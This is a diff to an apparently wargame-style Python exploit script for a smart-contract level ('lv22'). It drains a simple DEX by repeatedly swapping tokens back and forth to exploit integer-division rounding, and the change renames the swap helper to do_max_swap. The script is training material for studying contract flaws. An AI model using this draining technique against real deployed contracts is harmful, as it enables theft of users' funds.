@@ -12,7 +12,8 @@ def test_lv22():
 
 def exploit_lv22(contract: Dex, attacker: Account):
     # Attack vector: inteeger division (rounding down in favor of the attacker)
-    # Training: Learning how simple DEX works
+    # Training: learning how simple DEX works and where is the main source of mistakes
+
     t1 = SwappableToken(contract.token1())
     t2 = SwappableToken(contract.token2())
     contract.approve(contract.address, 1000)
@@ -21,8 +22,8 @@ def exploit_lv22(contract: Dex, attacker: Account):
     resolver.print_balances()
 
     for i in range(10):
-        resolver.do_swap(t1, t2)
-        resolver.do_swap(t2, t1)
+        resolver.do_max_swap(t1, t2)
+        resolver.do_max_swap(t2, t1)
 
 class DexTransactionResolver:
     tokens: List[SwappableToken]
@@ -34,7 +35,7 @@ class DexTransactionResolver:
         self.dex = dex 
         self.attacker = attacker
 
-    def do_swap(self, fromToken: SwappableToken, toToken: SwappableToken):
+    def do_max_swap(self, fromToken: SwappableToken, toToken: SwappableToken):
         attacker_tokens = fromToken.balanceOf(self.attacker.address)
         dex_tokens = fromToken.balanceOf(self.dex.address)
         amount = attacker_tokens if attacker_tokens < dex_tokens else dex_tokens
